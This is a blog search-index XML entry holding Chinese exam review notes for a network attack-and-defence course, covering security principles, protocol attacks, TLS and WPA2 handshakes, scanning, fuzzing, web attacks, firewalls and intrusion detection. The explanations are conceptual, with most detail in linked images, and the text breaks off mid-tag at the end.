<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>网络攻防复习</title>
      <link href="/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/"/>
      <url>/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="第一章、网络攻防基本概念"><a href="#第一章、网络攻防基本概念" class="headerlink" title="第一章、网络攻防基本概念"></a>第一章、网络攻防基本概念</h2><p>掌握：网络攻防的基本概念；安全攻击的概念，安全攻击类型； 网络攻击策略；攻击链步骤及含义；安全系统的设计原则，各安全原则的含义。</p><p>了解：各种网络安全事件，ATT&amp;CK 框架。</p><p>网络安全的属性：研究网络空间中的<strong>安全威胁</strong>和<strong>防护</strong>问题。网络空间信息的<strong>保密性、完整性、可用性、真实性和可控性</strong></p><p>核心属性：<strong>保密性、完整性、可用性</strong>（CIA）</p><p>保密性：确保隐私或者秘密信息不向非授权者泄露，也不被非授权者使用。防止数据的未授权访问</p><p>完整性：确保信息只能以特定和授权的方式进行改变。（数据完整性：确保信息和程序仅以授权方式进行变动。系统完整性：确保系统以非损害方式完成设计的功能，免受有意或无意对系统的非授权操作）</p><p>可用性：合法用户在需要使用网络资源的时候，能够获得正常的服务。</p><p>可控性：限制对网络资源和数据的访问，防止未授权使用资源、未授权公开或者修改数据。通过访问控制实现。</p><p>不可否认性、真实性、可靠性。</p><p><em>SYN<em>：同步序列编号（</em>Syn<em>chronize Sequence Numbers）。是TCP/IP建立连接时使用的握手信号。在客户机和服务器之间建立正常的TCP网络连接时，客户机首先发出一个</em>SYN<em>消息，服务器使用</em>SYN</em>+ACK应答表示接收到了这个消息，最后客户机再以ACK消息响应。</p><p><em>Telnet</em>协议是TCP/IP协议族中的一员，是Internet<em>远程登录</em>服务的标准协议和主要方式。它为用户提供了在本地计算机上完成远程主机工作的能力。在终端使用者的电脑上使用<em>telnet</em>程序，用它连接到服务器。</p><p>病毒：指编制或者在计算机程序中插入的破坏计算机功能或者破坏数据，影响计算机使用并且能够自我复制的一组计算机指令或者程序代码。（自动执行、自我复制）</p><p>蠕虫病毒：利用网络进行复制和传播。蠕虫病毒是自包含程序，能传播自身功能的拷贝或自身的某些部分到其他的计算机系统中。</p><p>木马：指那些表面上有用的软件、实际目的却是危害计算机安全并导致严重破坏的计算机程序。（隐蔽性、非授权性）木马不具传染性，它并不能像病毒那样复制自身、木马一般主要以窃取用户相关信息或隐蔽性控制为主要目的</p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219164301808.png" alt="图1"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219164330823.png" alt="图2"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219164400208.png" alt="图3"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219164422783.png" alt="图4"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219171953591.png" alt="图5"></p><h3 id="构建安全系统的原则"><a href="#构建安全系统的原则" class="headerlink" title="构建安全系统的原则"></a>构建安全系统的原则</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219172103278.png" alt="图6"></p><p>最小权限原则：主体（用户、程序等）应该仅被授予完成任务所需的访问权限。主 体拥有的权限越少，在发生安全问题（如用户登录凭证泄露）时造 成的损失越小</p><p>默认故障安全原则：如果一个主体没有被明确授权访问一个对象，该主体应该被拒绝访问该对象。默认 故障安全原则要求对一个对象的默认访问是无权限。任何时候，只要安全相关的属 性（如访问权限等）没有明确授予，则应被拒绝。而且，如果主体不能在对象上完 成其操作，则主体应该在终止之前取消对系统安全状态的改变。该原则用于限制在 主体或者对象创建时，如何初始化权限。</p><p>安全机制的经济性原则：安全机制的经济性原则要求“安全机制应该尽可能简单”</p><p>完全仲裁原则：对资源的所有访问均需要审核。任何时候，当一个主体试图读 取一个对象，操作系统都应该审核该行为。</p><p>开放设计原则：和Kerckhoff原则一致，密码系统应该在就算攻击者知道所有系 统内部细节的情况下也保持安全</p><p>权限分离原则：系统不能基于单一条件来授予访问许可，或者说系统需要同时 满足多个条件时，才授予某个主体对某个资源的访问许可。</p><p>最少共用机制：互不信任的用户之间访问资源的共用机制应该最小化</p><p>心理可接受原则：安全机制不应该增加访问资源的难度，安全机制应该易于使用。</p><p>纵深防御：指在一个信息系统（包括：单机系统、网络系统等）中部署多 层次的安全控制（防御）措施，其目的是提供冗余的安全保护， 同时不同防御措施之间还存在互补性，以免一个防御措施失效， 整个系统沦陷。</p><h2 id="第二章、互联网协议的安全性分析"><a href="#第二章、互联网协议的安全性分析" class="headerlink" title="第二章、互联网协议的安全性分析"></a>第二章、互联网协议的安全性分析</h2><p>掌握：TCP/IP 协议栈各层的的常见网络攻击原理与实例，包括网络嗅探、交换机毒化、ARP 欺骗、IP 假冒、IP 碎片、拒绝服务、序列号猜测、Land 攻击、UDP 劫持、DNS 欺骗、DNS 毒化攻击的原理。</p><p>了解：计网相关的知识。</p><h3 id="网络嗅探"><a href="#网络嗅探" class="headerlink" title="网络嗅探"></a>网络嗅探</h3><p>集线器本质上是物理层的中继器</p><p>交换机采用接口转发方式实现主机间的通信</p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219173822882.png" alt="图7"></p><h3 id="交换机毒化"><a href="#交换机毒化" class="headerlink" title="交换机毒化"></a>交换机毒化</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219191508435.png" alt="图7"></p><h3 id="ARP欺骗"><a href="#ARP欺骗" class="headerlink" title="ARP欺骗"></a>ARP欺骗</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219192344288.png" alt="图8"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219192759187.png" alt="图9"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219192912235.png" alt="图10"></p><h3 id="IP假冒攻击"><a href="#IP假冒攻击" class="headerlink" title="IP假冒攻击"></a>IP假冒攻击</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219193913746.png" alt="图11"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219194219055.png" alt="图12"></p><h3 id="IP碎片攻击"><a href="#IP碎片攻击" class="headerlink" title="IP碎片攻击"></a>IP碎片攻击</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219195043370.png" alt="图12"></p><h3 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219200244726.png" alt="图13"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219200350137.png" alt="图14"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219200406866.png" alt="图15"></p><h3 id="UPD反射攻击"><a href="#UPD反射攻击" class="headerlink" title="UPD反射攻击"></a>UPD反射攻击</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219200558537.png" alt="图16"></p><h3 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a>DNS欺骗</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219201020953.png" alt="图17"></p><h3 id="DNS毒化"><a href="#DNS毒化" class="headerlink" title="DNS毒化"></a>DNS毒化</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219201142321.png" alt="图18"></p><h3 id="基于DNS的DDoS"><a href="#基于DNS的DDoS" class="headerlink" title="基于DNS的DDoS"></a>基于DNS的DDoS</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219201239497.png" alt="图19"></p><h2 id="第三章、网络安全协议基础"><a href="#第三章、网络安全协议基础" class="headerlink" title="第三章、网络安全协议基础"></a>第三章、网络安全协议基础</h2><p>掌握：安全协议的设计原理，包含哪些要素；TCP/IP 协议栈包含 的安全协议。综合运用公钥密码体制、对称加密和数字签名等密码技 术设计基本的网络安全协议。</p><p>了解：密码学基础知识</p><h3 id="安全协议设计思路"><a href="#安全协议设计思路" class="headerlink" title="安全协议设计思路"></a>安全协议设计思路</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219201755303.png" alt="图20"></p><h3 id="网络安全协议概览"><a href="#网络安全协议概览" class="headerlink" title="网络安全协议概览"></a>网络安全协议概览</h3><p>应用层：PGP。提供安全服务：保密性、数字签名</p><p>传输层：SSL/TLS。提供安全服务：身份认证、保密性、完整性</p><p>IP层：IPSec（AH/ESP）。提供安全服务：完整性、保密性、认证、重放保护。AH协议提供源发认证和数据完整性，但是不提供保密性，ESP协议提供认证、数据完整性和保密性</p><p>数据链路层：WPA/WPA2。提供安全服务：身份认证、保密性</p><h3 id="PGP概述"><a href="#PGP概述" class="headerlink" title="PGP概述"></a>PGP概述</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219203028798.png" alt="图21"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219203209848.png" alt="图22"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219203220216.png" alt="图23"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219203228497-16768099489861.png" alt="图24"></p><h2 id="第四章、传输层安全协议TLS"><a href="#第四章、传输层安全协议TLS" class="headerlink" title="第四章、传输层安全协议TLS"></a>第四章、传输层安全协议TLS</h2><p>掌握：TLS1.2 协议的构成及原理，握手协议的规范，协议的时序和完整握手过程的消息类型；Finished 消息的构成，会话恢复的原理。</p><p>了解：协议描述语言。</p><h3 id="TLS构成"><a href="#TLS构成" class="headerlink" title="TLS构成"></a>TLS构成</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219203949294.png" alt="图25"></p><p>TLS Handshake Protocol：通信双方协商确定用于记录层的安全参数（密码套件、Premaster secret、身份认证）</p><p>ChangeCipherSpec Protocol：发信号给通信对端，表示要切换到新协商确定的密码规格。</p><p>Alert Protocol：用于传递协议运行过程中出现的警报，包括警报的严重性（warning or fatal）和对警报的描述。</p><p>Application Data Protocol：给record层提供application data用于传输。</p><h3 id="Handshake-protocol"><a href="#Handshake-protocol" class="headerlink" title="Handshake protocol"></a>Handshake protocol</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219204751229.png" alt="图26"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219204837679.png" alt="图27"></p><p>HelloRequest：HelloRequest是一个简单的通知，告诉client应该 重新开始一个协商过程。作为响应，client应该在 合适的时候发送ClientHello消息。如果client当前 正在协商一个会话，则该消息会被忽略。</p><p>ClientHello：在一次新的握手流程中，ClientHello消息总是第一条消息。 ClientHello消息将客户端支持的功能和首选项发送给服务器</p><p>ServerHello：当服务器收到来自客户端的ClientHello消息后，如果它能够 找到一套可以接受的算法（即可以就加密算法等取得协商一 致），服务器将发送 ServerHello消息来响应客户端的 ClientHello消息。如果不能找到一套匹配的算法，则服务器 将响应handshake failure alert。</p><p>Certificate：服务器向客户端发送Certificate消息，使得客户 端能够认证服务器的身份。 匿名通信的情况下 ， 服务器不需要发送 certificate消息。</p><p>ServerKeyExchange：服务器发送server Certificate消息后，立即发送ServerKeyExchange消 息（如果是匿名协商，则在ServerHello后立即发送该消息）。同时，仅 当server Certificate消息包含的信息不足以让客户端交换一个premaster secret 时 ， 才发送 ServerKeyExchange 消 息 。 比如： DHE_DSS 、 DHE_RSA 、 DH_anon 。 而 对 于 密 钥 交 换 算 法 RSA 、 DH_DSS 、 DH_RSA，如果发送ServerKeyExchange消息则是非法。</p><p>CertificateRequest：服务器使用CertificateRequest消息请求对客户端进 行身份验证，其中包含了服务器可以接受的证书类型 列表，可接受的CA的列表</p><p>ServerHelloDone：服务器发送ServerHelloDone消息来表示ServerHello 及相关消息的结束，这些消息用于完成密钥交换，发 送该消息后，服务器将等待客户端响应。而客户端收 到 该 消 息 后 ， 可 以 继 续 他 的 密 钥 交 换 阶 段 。 ServerHelloDone消息不包含任何内容</p><p>ClientKeyExchange：如 果 客 户 端 发 送 了 Client Certificate 消 息 ， ClientKeyExchange消息应该在该消息后立即发送。 否 则 ， 在客户端收到服务器发送的 ServerHelloDone后立即发送该消息</p><p>CertificateVerify：只有服务器向客户端发送CertificateRequest消息的 情况下，客户端才会向服务器发送CertificateVerify 消息，以向服务器证明自己的确持有客户端证书的私 钥</p><h3 id="Finished"><a href="#Finished" class="headerlink" title="Finished"></a>Finished</h3><p>发送ChangeCipherSpec来激活已经协商好的密码套件之后，客户端 发送Finished消息，表明TLS握手协商完成，相当于告诉服务器“握 手结束。</p><p>由于已经完成了密码规格切换，因此Finished消息是使用切换后的密码套件来发送的，也就是Finished消息不是以明文方式发送的，而是 通过下层的记录协议进行加密发送。</p><p>Finished 消息的内容采用 PRF 函数生成 ， 其输入包括： master_secret, finished_label，之前所有handshake消息组合的hash值</p><p>服务器可以通过对收到的消息进行验证来确认收到的Finished 消息是否正确，从而可以确认握手协议是否正常结束，密码套件的切换是否正确。</p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220222255623.png" alt="图28"></p><h3 id="TLS的密钥"><a href="#TLS的密钥" class="headerlink" title="TLS的密钥"></a>TLS的密钥</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220223817901.png" alt="图29"></p><h4 id="pre-master-secret"><a href="#pre-master-secret" class="headerlink" title="pre_master_secret"></a>pre_master_secret</h4><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220225022680.png" alt="图30"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220225031634.png" alt="图31"></p><h4 id="pre-master-secret→master-secret"><a href="#pre-master-secret→master-secret" class="headerlink" title="pre_master_secret→master_secret"></a>pre_master_secret→master_secret</h4><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220225410324.png" alt="图32"></p><h4 id="密钥导出"><a href="#密钥导出" class="headerlink" title="密钥导出"></a>密钥导出</h4><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220225916492.png" alt="图33"></p><h3 id="消息恢复"><a href="#消息恢复" class="headerlink" title="消息恢复"></a>消息恢复</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220230156796.png" alt="图34"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220230213428.png" alt="图35"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220230229196.png" alt="图36"></p><h3 id="Session-ticket"><a href="#Session-ticket" class="headerlink" title="Session ticket"></a>Session ticket</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220230628561.png" alt="图37"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220230651612.png" alt="图38"></p><h2 id="第五章、无线局域网安全Wlan"><a href="#第五章、无线局域网安全Wlan" class="headerlink" title="第五章、无线局域网安全Wlan"></a>第五章、无线局域网安全Wlan</h2><p>掌握：WEP 加解密原理及安全性缺陷，RSNA 密钥层次，4-way 握手原理及各字段的用途，PMK，PTK，GTK，MIC 等生成原理。</p><p>了解：无线局域网基础知识，TKIP、CCMP 封装。</p><h3 id="WEP"><a href="#WEP" class="headerlink" title="WEP"></a>WEP</h3><p>WEP安全服务：身份认证、保密性、完整</p><p>WEP加密流程</p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220231940794.png" alt="图39"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220232229483.png" alt="图40"></p><p>WEP解密流程</p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220232136221.png" alt="图41"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220232242971.png" alt="图42"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220232319413.png" alt="图43"></p><h3 id="RSNA密钥管理"><a href="#RSNA密钥管理" class="headerlink" title="RSNA密钥管理"></a>RSNA密钥管理</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220233130662.png" alt="图44"></p><h3 id="4次握手"><a href="#4次握手" class="headerlink" title="4次握手"></a>4次握手</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220233347773.png" alt="图45"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220233538980.png" alt="图46"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220233426149.png" alt="图47"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220233554461.png" alt="图48"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220233603869.png" alt="图49"></p><p>MIC: 128-bits。用于验证STA拥有正确的PTK，从而拥有正确的PMK，也就是验证了STA的合法性（真实性）。</p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220233635365.png" alt="图50"></p><p>MIC: 计算方法与第二个握手包相同。用于鉴别AP的真实性（不是流氓 AP），一旦STA验证了MIC，则STA能够确定该AP拥有正确的PTK，从而拥 有正确的PMK，而只有正确的AP才能知道PMK，因此验证了AP的真实性。</p><p>WPA Key Data：包含了加密的GTK</p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220233707949.png" alt="图51"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230220233857734.png" alt="图52"></p><p>ANonce是以明文方式传送的，如果ANonce被攻击者篡改了，会有什么 后果？密钥建立过程会成功吗？ </p><p>◼如果ANonce被修改了，会导致STA和AP计算出的PTK不一致，从而KCK 不一致，最终导致计算出的MIC不能通过验证。标准规定，如果接收方的MIC验证没有通过，则对应的消息必须丢弃。因此，虽然攻击者能够 修改ANonce，但是握手过程不会成功。</p><p>◼此外，作为一种额外的防御措施，第三个握手包也包含了ANonce。接收方必须验证在第三个握手包中的ANonce和第一个握手包里面的ANonce是 一样的，而第三个握手包是通过MIC保护的EAPOL-key帧，因此如果第三 个握手包通过MIC验证则表示传输的ANonce是没有被篡改，进而如果第三 个握手包中的ANonce和第一个握手包中的ANonce一致，则表示第一个握 手包中的ANonce是正确的。</p><h2 id="第六章、渗透测试"><a href="#第六章、渗透测试" class="headerlink" title="第六章、渗透测试"></a>第六章、渗透测试</h2><p>掌握：网络扫描的类型、功能和适用场景。 </p><p>了解：扫描网络扫描工具的使用方式。</p><h2 id="网络扫描"><a href="#网络扫描" class="headerlink" title="网络扫描"></a>网络扫描</h2><ul><li>网络扫描的基本目的是探测目标网络，以找出尽可能多的活跃主机，然后再进一步探测目标OS类型、存在的安全弱点等信息，为下一步攻击选择恰当目标和通道提供支持。</li><li>通过对待扫描的网络主机发送特定的数据包，根据返回的数据包来判断 待扫描的系统的端口及相关的服务有没有开启。</li></ul><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230213105206665.png" alt="图53"></p><h3 id="主机扫描-ICMP"><a href="#主机扫描-ICMP" class="headerlink" title="主机扫描-ICMP"></a>主机扫描-ICMP</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230213105350393.png" alt="图54"></p><h3 id="主机扫描-TCP"><a href="#主机扫描-TCP" class="headerlink" title="主机扫描-TCP"></a>主机扫描-TCP</h3><ul><li>使用TCP协议的主机扫描——TCP ACK Ping扫描</li></ul><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230213105800810.png" alt="图55"></p><ul><li>使用TCP协议的主机扫描——TCP SYN Ping扫描</li></ul><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230213105831817.png" alt="图56"></p><h3 id="主机扫描-UDP"><a href="#主机扫描-UDP" class="headerlink" title="主机扫描-UDP"></a>主机扫描-UDP</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230213110225729.png" alt="图57"></p><p>主机扫描工具-Nmap</p><h3 id="端口扫描TCP-connect"><a href="#端口扫描TCP-connect" class="headerlink" title="端口扫描TCP connect"></a>端口扫描TCP connect</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230213111437042.png" alt="图58"></p><h3 id="端口扫描TCP-SYN"><a href="#端口扫描TCP-SYN" class="headerlink" title="端口扫描TCP SYN"></a>端口扫描TCP SYN</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230213112721959.png" alt="图59"></p><h3 id="端口扫描：隐蔽端口扫描"><a href="#端口扫描：隐蔽端口扫描" class="headerlink" title="端口扫描：隐蔽端口扫描"></a>端口扫描：隐蔽端口扫描</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230213112831641.png" alt="图60"></p><p>端口扫描Nmap</p><h3 id="操作系统-服务类型探测"><a href="#操作系统-服务类型探测" class="headerlink" title="操作系统/服务类型探测"></a>操作系统/服务类型探测</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230213113019841.png" alt="图61"></p><p>网络服务类型探查：探测目标网络中开放的端口以确定服务的类型和版本信息</p><h2 id="第七章、软件安全"><a href="#第七章、软件安全" class="headerlink" title="第七章、软件安全"></a>第七章、软件安全</h2><p>掌握：模糊测试的概念，通用步骤；函数调用栈工作原理，栈内数据存储方式，缓冲区溢出原理、技术实现及防御措施。</p><p>了解：汇编语言，gdb 调试</p><h2 id="模糊测试"><a href="#模糊测试" class="headerlink" title="模糊测试"></a>模糊测试</h2><ul><li>模糊测试(Fuzzing)是一种自动化或半自动化的软件安全漏洞检测技术，通过向目标软件输入大量的畸形数据并监测目标系统的异常 来发现潜在的软件漏洞。</li><li>模糊测试属于黑盒测试的一种，它是一种有效的动态漏洞分析技术， 黑客和安全技术人员使用该项技术已经发现了大量的未公开漏洞。</li><li>模糊测试的缺点是畸形数据的生成具有随机性，而随机性造成代码 覆盖不充分导致了测试数据覆盖率不高。</li></ul><p>分类：</p><ul><li><strong>基于生成</strong>的模糊测试：它是指依据特定的文件格式或者协议规范组合生成测试用例，该方法的关键 点在于既要遵守被测程序的输入数据的规范要求，又要能变异出区别于正常 的数据。</li><li><strong>基于变异</strong>的模糊测试：它是指在原有合法的测试用例基础上，通过变异策略生成新的测试用例。变 异策略可以是随机变异策略、边界值变异策略、位变异策略等等，但前提条 件是给定的初始测试用例是合法的输入。</li></ul><h3 id="模糊测试步骤"><a href="#模糊测试步骤" class="headerlink" title="模糊测试步骤"></a>模糊测试步骤</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230213174648563.png" alt="图62"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230213174731022.png" alt="图63"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230213175333333.png" alt="图64"></p><h2 id="第八章、web应用安全"><a href="#第八章、web应用安全" class="headerlink" title="第八章、web应用安全"></a>第八章、web应用安全</h2><p>掌握：Server 端和客户端端攻击原理及防御措施，包括命令注入、 SQL 注入、CSRF 和 XSS 的具体攻击过程和对应防御措施。</p><p>了解：Web 应用基础，Web 安全基础</p><h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230214103900138.png" alt="图65"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230214104352155.png" alt="图66"></p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>造成SQL注入、XSS攻击、 命令注入攻击和格式化 字符串攻击的根本原因 是代码和数据的混合</p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230214105551738.png" alt="图67"></p><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230214105701290.png" alt="图67"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230214105908387.png" alt="图68"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230214105949283.png" alt="图69"></p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230214110052090.png" alt="图70"></p><p>存储型XSS流程</p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230214110122875.png" alt="图71"></p><p>反射型XSS</p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230214110657514.png" alt="图72"></p><h2 id="第九章、网络隔离技术"><a href="#第九章、网络隔离技术" class="headerlink" title="第九章、网络隔离技术"></a>第九章、网络隔离技术</h2><p>掌握：网络隔离原理及部署，包过滤防火墙原理及规则设计，状态防火墙原理。</p><p>了解：iptables，物理隔离</p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230214111006969.png" alt="图73"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230214112410920.png" alt="图74"></p><p>防火墙的经典部署：1.对两个或者多个安全域之间的流量进行控制</p><p>2.<img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230214112634207.png" alt="图75"></p><h3 id="包过滤防火墙"><a href="#包过滤防火墙" class="headerlink" title="包过滤防火墙"></a>包过滤防火墙</h3><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230214132615329.png" alt="图76"></p><h2 id="第十章、入侵检测技术"><a href="#第十章、入侵检测技术" class="headerlink" title="第十章、入侵检测技术"></a>第十章、入侵检测技术</h2><p>掌握：入侵检测的功能、分类、不同入侵检测技术的特点及部署方式，snort工作原理及规则编写，包括规则头构成，规则选项构成， 选项中的 msg，sid，rev，content，offset，distance 标签的正确使用。</p><p>了解：Snort 的使用方法</p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230219164127781.png" alt="图77"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230221001008983.png" alt="图78"></p><p><img src="https://zhukai1217.github.io/qiuyu.github.io/2023/02/23/wang-luo-gong-fang-fu-xi/image-20230221001021918.png" alt="图79"></p><p><img 